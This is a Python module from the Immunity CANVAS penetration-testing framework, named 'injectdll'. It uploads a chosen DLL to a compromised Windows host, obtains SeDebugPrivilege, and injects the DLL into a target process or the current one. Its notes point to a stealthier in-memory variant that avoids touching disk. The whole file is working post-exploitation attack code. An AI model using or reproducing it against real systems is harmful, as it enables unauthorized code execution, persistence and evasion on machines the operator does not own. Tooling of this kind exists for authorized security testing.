#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import time
import canvasengine
from exploitutils import *

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
from canvaserror import *

NAME             = "injectdll"
DESCRIPTION      = "Upload a DLL and inject into a running process."
DOCUMENTATION    = {}
VERSION          = "1.0"

PROPERTY         = {}
PROPERTY['TYPE'] = "Commands"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows"] ]

DOCUMENTATION["Notes"] = """

CANVAS module `inject_from_mem' will perform DLL injection in a much
stealthier way as it doesn't touch disk at all. One is therefore advised
to use it instead of `injectdll' which is considered deprecated.

"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result      = ""
        self.name        = NAME
        self.pid         = 0
        self.srcfile     = None
        self.remote_file = None

    def getArgs( self ):
        self.pid     = self.argsDict.get("pid", self.pid)
        self.srcfile = self.argsDict.get("srcfile", self.srcfile)

    def upload_dll( self, node ):
        if "\\" in self.srcfile:
            filename = self.srcfile.split("\\")[::-1][0]
        else:
            filename = self.srcfile.split("/")[::-1][0]

        self.remote_file  = "%s\\%s" % ( node.shell.getcwd(), filename )

        ret = 0

        try:
            node.upload( self.srcfile, destfilename = self.remote_file )
            ret = 1
        except NodeCommandError, i:
            e = "Failed to upload on node %s: %s" % (node.getname(), i)
            self.log(e)
            self.setInfo("%s - Done (failed on upload)" % NAME)

        return ret

    def inject_dll( self, node ):
        """
        Just a straight-up DLL injection. No magic here.
        """

        if self.pid == 0 or self.pid == "":
            self.log("No PID specified, using current process as injection target.")
            self.pid = node.shell.GetCurrentProcess()
            ret = node.shell.loadlibrarya(self.remote_file)
        else:
            self.pid = int(self.pid)
            self.log( "[!] Getting SeDebugPrivilege ..." )
            self.exploitnodes("getpriv", [node], {"privname":"SeDebugPrivilege"})
            ret = node.shell.injectdll(self.pid, self.remote_file)

        if ret > 0:
            self.log("DLL injected and loaded using thread ID: 0x%08x" % ret)
            self.setInfo("%s - done (Success!)" % NAME )
            return 1
        else:
            self.log("Failed to inject DLL on remote host. Unknown error.")
            self.setInfo("%s - done (failed)" % NAME)
            return 0

    def run(self):
        self.setInfo("%s (in progress)" % NAME)
        self.getArgs()
        node = self.argsDict["passednodes"][0]

        if self.srcfile is None:
            self.log("Please enter a source DLL to upload and inject.")
            self.setInfo("%s - done (failed)" % NAME )
            return 0

        self.result = []

        for node in self.argsDict["passednodes"]:
            nodetype = node.nodetype
            capabilities = node.capabilities

            if "win32api" in capabilities:
                # Upload the DLL first
                ret = self.upload_dll(node)

                if ret != 0:
                    ret = self.inject_dll(node)
                    self.result += [ret]

            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command" % (node.get_name(), nodetype))
                self.result+=[0]

        self.dispshellcmd = self.command
        self.setInfo("%s - done" % (NAME))
        return 1 if 1 in self.result else 0

